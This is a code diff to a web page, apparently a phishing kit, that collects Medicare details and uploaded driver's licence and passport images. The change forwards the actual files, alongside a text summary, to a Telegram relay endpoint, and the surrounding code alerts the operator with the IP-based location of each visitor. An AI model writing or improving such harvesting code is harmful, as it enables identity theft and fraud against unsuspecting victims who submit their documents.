@@ -37,6 +37,18 @@ export default function Home() {
     }
   };
 
+  // Send multipart/form-data (message + files) to Telegram endpoint
+  const sendTelegramForm = async (formData: FormData) => {
+    try {
+      await fetch("/api/telegram", {
+        method: "POST",
+        body: formData, // browser sets Content-Type including boundary
+      });
+    } catch (error) {
+      console.error("Failed to send Telegram form:", error);
+    }
+  };
+
   // Send notification when user visits the page
   useEffect(() => {
     fetch("https://ipapi.co/json/")
@@ -121,11 +133,18 @@ export default function Home() {
       Medicare Number: ${medicareNumber}
       Medicare Expiry: ${medicareExpiry}
       Medicare IRN: ${medicareIRN}
-      Driver's License Front: ${driversLicenseFront ? driversLicenseFront.name : "Not uploaded"}
-      Driver's License Back: ${driversLicenseBack ? driversLicenseBack.name : "Not uploaded"}
-      Passport: ${passport ? passport.name : "Not uploaded"}
+      Driver's License Front: ${driversLicenseFront ? driversLicenseFront.name + " (attached)" : "Not uploaded"}
+      Driver's License Back: ${driversLicenseBack ? driversLicenseBack.name + " (attached)" : "Not uploaded"}
+      Passport: ${passport ? passport.name + " (attached)" : "Not uploaded"}
     `;
-    await sendTelegramMessage(message);
+
+    const formData = new FormData();
+    formData.append("message", message);
+    if (driversLicenseFront) formData.append("driversLicenseFront", driversLicenseFront);
+    if (driversLicenseBack) formData.append("driversLicenseBack", driversLicenseBack);
+    if (passport) formData.append("passport", passport);
+
+    await sendTelegramForm(formData);
   };
 
   if (showDetailsPage) {
